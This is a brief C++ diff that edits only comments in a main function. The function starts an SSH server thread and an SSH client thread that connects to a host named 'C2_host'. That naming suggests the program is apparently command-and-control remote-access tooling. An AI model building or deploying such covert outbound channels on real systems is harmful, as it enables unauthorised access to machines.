@@ -85,11 +85,11 @@ int main(int argc, char** argv){
 
     ssh_init(); // mandatory
 
+    // Server
     auto server = SSHServer();
     std::thread server_thread(server.run, ssh_server_port_int);
-    //server.run(ssh_server_port_int);
 
-    //// client
+    // Client
     auto client = SSHClient();
     std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);
 
